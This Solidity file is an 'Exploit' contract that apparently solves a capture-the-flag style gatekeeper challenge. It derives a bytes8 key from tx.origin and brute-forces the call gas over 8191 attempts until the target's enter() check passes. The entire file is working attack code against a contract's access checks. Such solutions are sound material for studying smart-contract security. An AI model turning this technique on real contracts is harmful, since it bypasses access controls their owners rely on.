pragma solidity 0.8.19;

interface IEnter {
    function entrant() external view returns (address);

    function enter(bytes8 _gateKey) external returns (bool);
}

contract Exploit {
    function exploit(address _target) public returns (bool) {
        bytes8 key = bytes8(0x1000000000000000 + uint16(uint160(tx.origin)));
        for (uint i = 0; i < 8191; i++) {
            try IEnter(_target).enter{gas: i + 22000}(key) {
                return true;
            } catch {
                continue;
            }
        }

        return false;
    }
}
